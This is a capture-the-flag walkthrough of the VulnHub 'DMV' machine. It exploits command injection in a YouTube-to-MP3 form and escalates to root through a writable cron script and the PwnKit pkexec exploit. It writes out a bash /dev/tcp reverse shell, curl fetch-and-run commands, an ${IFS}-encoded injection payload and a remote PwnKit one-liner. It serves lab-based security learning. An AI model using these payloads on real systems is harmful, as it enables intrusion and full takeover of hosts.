---
tags:
  - VulnHub
  - Linux
  - Easy
  - RCE
  - Cron
  - PwnKit
---
https://www.vulnhub.com/entry/dmv-1,462/
# Add Hosts
Append to the `/etc/hosts` file:
```text
192.168.0.199 DMV.local
```
# Scanning
```console
$ nmap -p22,80 -sV -sC DMV.local

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 65:1b:fc:74:10:39:df:dd:d0:2d:f0:53:1c:eb:6d:ec (RSA)
|   256 c4:28:04:a5:c3:b9:6a:95:5a:4d:7a:6e:46:e2:14:db (ECDSA)
|_  256 ba:07:bb:cd:42:4a:f2:93:d1:05:d0:b3:4c:b1:d9:b1 (ED25519)
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
|_http-title: Site doesn't have a title (text/html; charset=UTF-8).
|_http-server-header: Apache/2.4.29 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```
# Discovery
Website converts YouTube videos to MP3 through POST requests containing data like: `yt_url=https://www.youtube.com/watch?v=12345`. So, we will create a function to make those POST requests:
```bash
postreq() {
	curl -s -X POST 'http://DMV.local/' \
		-H 'X-Requested-With: XMLHttpRequest' \
		--data-urlencode "$1" \
		--compressed
}
```
Found [warning message](https://github.com/ytdl-org/youtube-dl/issues/21057) of **youtube-dl** tool when the YouTube URL is empty:
```console
$ postreq ''

{"status":2,"errors":"WARNING: Assuming --restrict-filenames since file system encoding cannot encode all characters. Set the LC_ALL environment variable to fix this.\nUsage: youtube-dl [OPTIONS] URL [URL...]\n\nyoutube-dl: error: You must provide at least one URL.\nType youtube-dl --help to see a list of all options.\n","url_orginal":"","output":"","result_url":"\/tmp\/downloads\/67cfbc9ef04c9.mp3"}
```
Based on the response, the executed command is probably: `youtube-dl <yt_url>`.
# Exploitation
Successfully executed `whoami` command:
```console
$ postreq 'yt_url=$(whoami)'

{"status":1,"errors":"WARNING: Assuming --restrict-filenames since file system encoding cannot encode all characters. Set the LC_ALL environment variable to fix this.\nERROR: u'www-data' is not a valid URL. Set --default-search \"ytsearch\" (or run  youtube-dl \"ytsearch:www-data\" ) to search YouTube\n","url_orginal":"$(whoami)","output":"","result_url":"\/tmp\/downloads\/67cfbfc5df03d.mp3"}
```
Created file `rev.sh`:
```bash
#!/bin/bash

bash -i >& /dev/tcp/<ATTACKER-IP>/<PORT> 0>&1
```
Create a Python server and wait for connections in attacker's machine:
```console
$ python3 -m http.server 8000 &

$ nc -lvnp <PORT>
```
Establish a reverse shell connection. The spaces will be replaced for `${IFS}` in order to execute the command correctly.
```console
$ cmd='curl -O http://<ATTACKER-IP>:8000/rev.sh; chmod +x rev.sh; ./rev.sh'

$ payload=$(sed 's/ /${IFS}/g' <<< "$cmd")

$ postreq "yt_url=\$($payload)"
```
Read the **user flag**:
```bash
cat /var/www/html/admin/flag.txt
```
# Post-Exploitation
## Scheduled script
Found a script which deletes the `downloads` directory, probably executed periodically.
`cat /var/www/html/tmp/clean.sh`:
```bash
rm -rf downloads
```
Wait for connections in attacker's machine:
```bash
nc -lvnp <PORT>
```
Overwrite the script file:
```bash
echo 'bash -i >& /dev/tcp/<ATTACKER-IP>/<PORT> 0>&1' > /var/www/html/tmp/clean.sh
```
Get the **root flag** after connection:
```bash
cat /root/root.txt
```
## SUID binary (alternative)
Found binary `/usr/bin/pkexec` with **SUID** permissions:
```console
$ find / -perm -4000 2>/dev/null

/usr/bin/pkexec
```
Become root with [PwnKit exploit](https://github.com/ly4k/PwnKit):
```console
$ sh -c "$(curl -fsSL https://raw.githubusercontent.com/ly4k/PwnKit/main/PwnKit.sh)"

# whoami
root
```